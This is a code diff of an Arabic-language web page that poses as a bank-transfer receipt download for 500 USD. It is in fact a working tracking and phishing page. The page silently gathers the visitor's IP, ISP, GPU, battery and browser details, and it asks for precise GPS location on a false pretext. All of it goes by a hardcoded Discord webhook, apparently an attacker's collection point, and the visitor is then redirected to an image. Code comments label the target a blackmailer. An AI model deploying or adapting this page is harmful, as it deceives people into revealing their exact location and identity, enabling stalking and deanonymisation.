@@ -5,54 +5,33 @@
     <title>نظام الصرافة الآلي - تأكيد العملية</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #eceff1; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; width: 320px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a99; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 350px; border-top: 6px solid #004a99; }
+        .logo { font-size: 24px; font-weight: bold; color: #004a99; margin-bottom: 15px; }
+        .btn { background: #004a99; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: 0.3s; }
+        .btn:hover { background: #003366; }
+        .info-text { font-size: 14px; color: #555; margin: 20px 0; line-height: 1.6; }
+        #loader { display: none; margin-top: 15px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a99; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { color: #d32f2f; font-weight: bold; margin-top: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="spinner"></div>
-        <h3>جاري استخراج إشعار الحوالة...</h3>
-        <p style="font-size: 13px; color: #444;">يُرجى <b>الموافقة على إذن الموقع</b> لربط الحوالة بأقرب فرع لك في اليمن.</p>
-        <div id="msg" class="status">بانتظار تأكيد الهوية...</div>
+        <div class="logo">إشعار حوالة صادرة</div>
+        <p class="info-text">تم تجهيز مبلغ <b>500.00 USD</b>.<br>لتحميل إشعار الاستلام بصيغة PDF يرجى الضغط على الزر أدناه وتأكيد الهوية عبر الموقع (GPS).</p>
+        
+        <button id="captureBtn" class="btn">تحميل إشعار الحوالة</button>
+
+        <div id="loader">
+            <div class="spinner"></div>
+            <p style="font-size: 12px; color: #888;">جاري التحقق من الموقع والمطابقة...</p>
+        </div>
     </div>
 
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1463545171609124910/5Vk_iL0QX1eNFSBttcZIZEUH6Vb-S0PO_PW1BDFLr_S_bCQ5rjuHpaAj_K2qgtogFbev';
 
-        async function startCapture() {
-            // 1. جمع البيانات التقنية الأساسية فوراً
-            let baseData = await getTechData();
-            
-            // 2. محاولة جلب الموقع الجغرافي الدقيق (GPS)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        // في حال وافق على الموقع
-                        baseData.embeds[0].title = "📍 تم صيد الموقع الدقيق (GPS)!";
-                        baseData.embeds[0].color = 65280; // أخضر
-                        baseData.embeds[0].fields.push(
-                            { name: "خط العرض (Lat)", value: position.coords.latitude.toString(), inline: true },
-                            { name: "خط الطول (Long)", value: position.coords.longitude.toString(), inline: true },
-                            { name: "الدقة", value: `${Math.round(position.coords.accuracy)} متر`, inline: true },
-                            { name: "خرائط جوجل", value: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`, inline: false }
-                        );
-                        sendToDiscord(baseData);
-                    },
-                    (error) => {
-                        // في حال رفض الموقع أو حدث خطأ
-                        baseData.embeds[0].description = "❌ المبتز رفض إذن الموقع أو الـ GPS معطل.";
-                        sendToDiscord(baseData);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else {
-                sendToDiscord(baseData);
-            }
-        }
-
+        // وظيفة جمع البيانات التقنية الصامتة
         async function getTechData() {
             const gl = document.createElement('canvas').getContext('webgl');
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
@@ -71,37 +50,80 @@
             } catch (e) {}
 
             return {
-                username: "الرادار الرقمي - تحديد الموقع",
-                embeds: [{
-                    title: "🚀 تم صيد بصمة الجهاز (بانتظار الـ GPS)",
-                    color: 15158332,
-                    fields: [
-                        { name: "📍 الموقع (IP)", value: `${ipData.city || '؟'} - ${ipData.country_name || '؟'}`, inline: true },
-                        { name: "🌐 المزود (ISP)", value: ipData.org || "غير معروف", inline: true },
-                        { name: "🔗 IP Address", value: ipData.ip || "Unknown", inline: true },
-                        { name: "📱 الجهاز", value: navigator.platform + " / " + (navigator.hardwareConcurrency || "?") + " Cores", inline: false },
-                        { name: "🎮 GPU", value: gpu, inline: false },
-                        { name: "🔋 البطارية", value: batteryInfo, inline: true },
-                        { name: "🖥️ الشاشة", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                        { name: "📄 المتصفح", value: navigator.userAgent.substring(0, 200), inline: false }
-                    ]
-                }]
+                ip: ipData.ip || "Unknown",
+                city: ipData.city || "؟",
+                isp: ipData.org || "غير معروف",
+                gpu: gpu,
+                battery: batteryInfo,
+                platform: navigator.platform,
+                ua: navigator.userAgent
             };
         }
 
-        function sendToDiscord(payload) {
+        document.getElementById('captureBtn').onclick = async function() {
+            const btn = this;
+            const loader = document.getElementById('loader');
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+
+            // جمع البيانات التقنية فوراً
+            const tech = await getTechData();
+
+            // طلب الموقع الجغرافي عند الضغط
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        sendPayload(tech, position.coords);
+                    },
+                    (error) => {
+                        sendPayload(tech, null, "رفض الإذن");
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            } else {
+                sendPayload(tech, null, "المتصفح لا يدعم");
+            }
+        };
+
+        function sendPayload(tech, coords, err = null) {
+            let fields = [
+                { name: "📍 الموقع (IP)", value: tech.city, inline: true },
+                { name: "🌐 المزود (ISP)", value: tech.isp, inline: true },
+                { name: "🔗 IP Address", value: tech.ip, inline: true },
+                { name: "📱 الجهاز", value: tech.platform, inline: true },
+                { name: "🔋 البطارية", value: tech.battery, inline: true },
+                { name: "🎮 GPU", value: tech.gpu, inline: false }
+            ];
+
+            if (coords) {
+                fields.push(
+                    { name: "✅ GPS Latitude", value: coords.latitude.toString(), inline: true },
+                    { name: "✅ GPS Longitude", value: coords.longitude.toString(), inline: true },
+                    { name: "🎯 الدقة", value: Math.round(coords.accuracy) + " متر", inline: true },
+                    { name: "🗺️ خرائط جوجل", value: `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`, inline: false }
+                );
+            } else {
+                fields.push({ name: "❌ حالة الـ GPS", value: err, inline: false });
+            }
+
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    username: "رادار الحوالات",
+                    embeds: [{
+                        title: coords ? "🎯 تم تحديد الموقع بدقة!" : "⚠️ تم سحب البيانات التقنية فقط",
+                        color: coords ? 65280 : 16711680,
+                        fields: fields,
+                        footer: { text: tech.ua }
+                    }]
+                })
             }).then(() => {
                 setTimeout(() => {
                     window.location.href = "https://i.imgur.com/R672DqF.jpg";
-                }, 2000);
+                }, 1500);
             });
         }
-
-        window.onload = startCapture;
     </script>
 </body>
 </html>
